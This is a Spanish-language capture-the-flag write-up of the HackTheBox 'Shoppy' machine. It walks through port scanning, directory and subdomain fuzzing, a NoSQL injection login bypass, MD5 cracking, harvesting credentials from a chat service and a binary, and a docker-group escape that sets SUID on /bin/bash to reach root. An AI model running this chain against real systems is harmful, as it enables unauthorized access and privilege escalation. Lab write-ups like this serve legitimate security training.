---
title: HackTheBox - Shoppy
author: cotes
date: 2023-09-20 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'NoSQL Injection', 'Cracking Password', 'Information Leakage', 'Docker Abusing']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Shoppy/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Shoppy Machine Logo
---

Máquina Linux de nivel **Easy** de HackThBox.

Técnicas usadas: **NoSQL Injection, Cracking Password, Information Leakage, Docker Abusing**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Shoppy/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Shoppy/02-versions.png)

* Añadimos el host al fichero /etc/hosts

c. La página web no tiene información relevante, por lo que haremos un fuzzing de directorios y de subdominios

```bash
❯ gobuster dir -u http://shoppy.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt

**Output**
```bash
/ADMIN                (Status: 302) [Size: 28] [--> /login]
/Admin                (Status: 302) [Size: 28] [--> /login]
/Login                (Status: 200) [Size: 1074]           
/admin                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]   
/exports              (Status: 301) [Size: 181] [--> /exports/]
/favicon.ico          (Status: 200) [Size: 213054]             
/fonts                (Status: 301) [Size: 177] [--> /fonts/]  
/images               (Status: 301) [Size: 179] [--> /images/] 
/js                   (Status: 301) [Size: 171] [--> /js/]     
/login                (Status: 200) [Size: 1074]


❯ wfuzz -c -t 100 --hc=404 --hh=169 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.shoppy.htb" http://shoppy.htb/

000047340:   200        0 L      141 W      3122 Ch     "mattermost"
```


* El panel de **login** es vulnerable a inyección [No SQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

    ![](/assets/images/HTB/Easy/Shoppy/03-nosql.png)

* Una vez en el sistema, podemos buscar usuario en el sistema, aquí también existe una inyección NOSQL y podremos descargar un fichero en el que se representará la información de todos los usuarios

    ![](/assets/images/HTB/Easy/Shoppy/04-data.png)

d. La clave que podemos crackear es la del usuario **josh**

```bash
❯ dcode 6ebcea65320589ca4f2f1ce039975995
<SNIP>
[+] Cracked MD5 Hash : remembermethisway
```

* Este usuario y contraseña son válidos para `mattermost.shoppy.htb`, aquí veremos credenciales válidas para SSH

    ![](/assets/images/HTB/Easy/Shoppy/05-creds.png)

### Escalada de Privilegios 💹

a. Listamos nuestro privilegios a nivel de sudoers

```bash
jaeger@shoppy:/home/deploy$ sudo -l
[sudo] password for jaeger: Sh0ppyBest@pp!

    (deploy) /home/deploy/password-manager
```

* Si le hacemos un cat a este binario, podremos ver la contraseña

    ```bash
    jaeger@shoppy:/home/deploy$ cat password-manager
    <SNIP>
    password: Sample
    <SNIP>
    ```

b. Ahora tendremos credenciales válidas para el usuario **deploy**

```bash
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
jaeger@shoppy:/home/deploy$ su deploy
Password: Deploying@pp!
$ bash  
deploy@shoppy:~$
```

c. Vemos los grupos de los que somos miembros

```bash
deploy@shoppy:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

* Ejecutamos un contenedor con una montura el sistema host en el directorio `/mnt` del contenedor

    ```bash
    deploy@shoppy:~$ docker run -v /:/mnt/ --rm -it alpine chroot /mnt sh
    # chmod +s /bin/bash
    # exit
    deploy@shoppy:~$ bash -p
    bash-5.1# whoami
    root
    ```

